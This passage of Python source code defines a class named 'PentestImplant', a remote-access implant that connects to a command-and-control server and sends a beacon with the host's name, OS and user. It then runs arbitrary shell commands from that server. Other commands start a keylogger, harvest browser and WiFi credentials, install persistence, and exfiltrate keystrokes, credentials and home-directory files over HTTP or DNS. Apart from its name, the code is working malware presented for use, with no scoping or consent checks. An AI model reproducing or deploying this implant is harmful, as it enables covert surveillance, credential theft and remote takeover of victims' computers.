            pass
        
        return collected


class PentestImplant:
    def __init__(self, c2_host, c2_port):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.shell = ReverseShell(c2_host, c2_port)
        self.keylogger = Keylogger()
        self.harvester = CredentialHarvester()
        self.exfil = DataExfiltrator(c2_host, c2_port)
        self.running = False
        self.modules = {}
    
    def start_keylogger(self):
        """Start keylogger in background"""
        self.keylogger.start()
        self.modules["keylogger"] = True
        return "[+] Keylogger started"
    
    def stop_keylogger(self):
        self.keylogger.stop()
        self.modules["keylogger"] = False
        keys = self.keylogger.get_buffer()
        return f"[+] Keylogger stopped. Captured: {len(keys)} keystrokes"
    
    def run_harvest(self):
        """Run credential harvesting"""
        results = self.harvester.harvest_all()
        report_file = f"harvest_{platform.node()}_{int(time.time())}.json"
        with open(report_file, "w") as f:
            json.dump(results, f, indent=2)
        return f"[+] Harvest complete. Results: {len(results.get('browsers', {}))} browsers, {len(results.get('wifi', []))} WiFi networks"
    
    def install_persistence(self):
        """Install persistence on target"""
        script_path = os.path.abspath(sys.argv[0])
        methods = Persistence.install(script_path)
        return f"[+] Persistence installed via: {', '.join(methods)}"
    
    def exfiltrate(self, data_type="harvest"):
        """Exfiltrate collected data"""
        if data_type == "harvest":
            data = self.harvester.results
        elif data_type == "keys":
            data = {"keystrokes": self.keylogger.get_buffer()}
        elif data_type == "files":
            data = self.exfil.exfil_directory(os.path.expanduser("~"))
        else:
            data = {"error": "Unknown data type"}
        
        # Try HTTP first, fallback to DNS
        if self.exfil.exfil_http(data):
            return "[+] Data exfiltrated via HTTP"
        elif self.exfil.exfil_dns(data):
            return "[+] Data exfiltrated via DNS"
        else:
            return "[-] Exfiltration failed — check C2 connectivity"
    
    def handle_custom_command(self, cmd):
        """Handle implant-specific commands (not shell commands)"""
        cmd = cmd.strip().lower()
        
        if cmd == "keylog_start":
            return self.start_keylogger()
        elif cmd == "keylog_stop":
            return self.stop_keylogger()
        elif cmd == "harvest":
            return self.run_harvest()
        elif cmd == "persistence":
            return self.install_persistence()
        elif cmd == "exfil":
            return self.exfiltrate("harvest")
        elif cmd == "exfil_keys":
            return self.exfiltrate("keys")
        elif cmd == "exfil_files":
            return self.exfiltrate("files")
        elif cmd == "status":
            return json.dumps({
                "modules": self.modules,
                "hostname": platform.node(),
                "user": os.getenv("USERNAME") or os.getenv("USER"),
                "uptime": int(time.time() - self.start_time),
                "c2": f"{self.c2_host}:{self.c2_port}"
            }, indent=2)
        elif cmd == "help":
            return """Implant Commands:
  keylog_start   — Start keylogger
  keylog_stop    — Stop and dump keys
  harvest        — Extract browser & WiFi creds
  persistence    — Install persistence
  exfil          — Exfiltrate harvested data
  exfil_keys     — Exfiltrate keystrokes
  exfil_files    — Exfiltrate document files
  status         — Show implant status
  help           — This menu
  exit           — Terminate implant
<shell>          — Any system command"""
        return None  # Not an implant command
    
    def run(self):
        """Main execution loop"""
        self.start_time = time.time()
        
        # Connect to C2
        print(f"[*] Connecting to C2 at {self.c2_host}:{self.c2_port}...")
        if not self.shell.connect():
            print("[-] Failed to connect to C2")
            return
        
        print("[+] Connected to C2")
        
        # Send initial beacon
        beacon = {
            "type": "beacon",
            "hostname": platform.node(),
            "os": platform.platform(),
            "user": os.getenv("USERNAME") or os.getenv("USER"),
            "time": datetime.now().isoformat()
        }
        self.shell.send(json.dumps(beacon))
        
        # Main loop — handle commands from C2
        while self.shell.running:
            command = self.shell.recv()
            if command is None:
                break
            
            # Check if it's an implant command first
            result = self.handle_custom_command(command)
            if result is not None:
                self.shell.send(result)
            else:
                # Fall through to system command
                output = self.shell.execute_command(command)
                self.shell.send(output)
        
        # Cleanup
        if self.keylogger.running:
            self.keylogger.stop()
        
        print("[*] Implant terminated")



